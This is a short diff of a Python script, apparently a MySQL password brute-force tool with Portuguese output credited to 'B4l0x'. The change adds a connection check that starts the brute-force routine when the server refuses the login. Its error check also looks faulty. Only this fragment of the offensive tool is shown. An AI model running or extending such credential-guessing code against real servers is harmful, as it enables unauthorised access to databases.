@@ -73,4 +73,13 @@ def iniciar():
     print("\n\n\t[{} INFO] Aguarde o script ser finalizado, obrigado por usar by B4l0x...\n".format(tempo))
     exit()
     
-iniciar()
+try:
+  con = mysql.connect(host=server, user=user, passwd=ii)
+except mysql.Error as err:
+  if Error(errno=1045):
+    print("[+] Host recebeu os pacotes")
+    print("[+] Iniciando brute force\n")
+    iniciar()
+except:
+  print("\n[!] Verifique servidor e porta e tente novamente, host sem resposta")
+  exit()
